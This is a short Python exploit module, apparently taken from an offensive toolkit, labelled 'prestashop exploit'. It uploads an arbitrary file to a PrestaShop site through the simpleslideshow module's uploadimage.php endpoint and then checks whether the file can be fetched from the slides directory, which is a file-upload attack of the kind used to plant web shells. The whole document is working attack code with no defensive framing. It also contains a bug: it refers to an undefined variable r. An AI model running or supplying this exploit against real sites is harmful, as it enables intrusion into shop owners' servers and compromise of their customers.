##
## prestashop exploit
##

from core.misc import printf
import requests

class exp:
    def __init__(self,web,file):
        if 'http' not in web:
            try:
                requests.get('http://' + web)
                self.url = 'http://' + web
            except:
                self.url = 'https://' + web
        else:
            self.url = web
        self.file = file
    def sss_ex(self):
        printf('[+] start uploading files (%s)' % self.file)
        files={'userfile':(self.file, open(self.file,'rb'),'multipart/form-data')}
        requests.post(self.url + "/modules/simpleslideshow/uploadimage.php",files=files)
        cek = requests.get(self.url + '/modules/simpleslideshow/slides/slides/' + self.file)
        if cek.status_code == 200:
            printf('[+] Success uploaded')
            printf('    => link: %s' % r.url)
        else:
            printf('[!] Failed uploaded!')
